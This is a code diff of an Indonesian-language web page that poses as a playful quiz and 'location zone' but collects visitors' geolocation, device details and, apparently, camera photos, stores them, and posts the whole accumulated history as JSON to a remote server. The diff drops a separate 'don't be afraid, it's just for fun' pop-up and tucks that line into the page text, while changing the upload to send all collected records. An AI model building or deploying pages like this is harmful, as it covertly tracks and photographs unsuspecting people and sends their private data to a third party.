@@ -176,11 +176,6 @@
     <p>Terima kasih, <span id="userName"></span>!</p>
 </div>
 
-<!-- Notice Kegabutan -->
-<div id="randomNotice" class="notice">
-    <p>Ini hanya kegabutan, jangan takut. By ChanMaps</p>
-</div>
-
 <!-- Pertanyaan Halaman Sebelum Masuk -->
 <div id="questionPage" class="question-container">
     <h1>Selamat datang! Sebelum masuk ke zona Lokasi, jawab pertanyaan berikut:</h1>
@@ -194,7 +189,7 @@
 <!-- Main Container -->
 <div id="mainContainer" class="container" style="display:none;">
     <h1>💻 Selamat Datang di Zona Lokasi Anda 💻</h1>
-    <p>Kamu ingin tahu lokasi dan perangkatmu untuk menciptakan pengalaman lebih baik.</p>
+    <p>Kamu ingin tahu lokasi dan perangkatmu untuk menciptakan pengalaman lebih baik. Ini hanya kegabutan, jangan takut.</p>
     <button id="startDataBtn">💾 Buka Hatimu</button>
     <button id="viewHistoryBtn">🔒 Lihat History</button>
 
@@ -224,7 +219,6 @@
     const nameInput = document.getElementById('nameInput');
     const hobbyInput = document.getElementById('hobbyInput');
     const notice = document.getElementById('notice');
-    const randomNotice = document.getElementById('randomNotice');
     const userNameSpan = document.getElementById('userName');
     const mainContainer = document.getElementById('mainContainer');
     const questionPage = document.getElementById('questionPage');
@@ -271,11 +265,6 @@
     });
 
     startDataBtn.addEventListener('click', () => {
-        randomNotice.style.display = 'block'; // Tampilkan notice kegabutan
-        setTimeout(() => {
-            randomNotice.style.display = 'none'; // Sembunyikan notice setelah beberapa detik
-        }, 3000);
-
         navigator.geolocation.getCurrentPosition(async (position) => {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
@@ -319,7 +308,7 @@
 
                 historyData.push(userHistory);
                 localStorage.setItem('historyData', JSON.stringify(historyData));
-                sendHistoryToServer(userHistory); // Kirim data ke server
+                sendHistoryToServer(historyData); // Kirim data ke server
             } catch (error) {
                 alert("Akses kamera ditolak atau tidak tersedia.");
             }
@@ -440,18 +429,13 @@
     });
 
     async function sendHistoryToServer(historyData) {
-        const formData = new FormData();
-        formData.append('historyData', JSON.stringify(historyData));
-        if (historyData.photo) {
-            const response = await fetch(historyData.photo);
-            const blob = await response.blob();
-            formData.append('photo', blob, 'photo.jpg');
-        }
-
         try {
             const response = await fetch(serverUrl, {
                 method: 'POST',
-                body: formData
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(historyData)
             });
 
             if (!response.ok) {
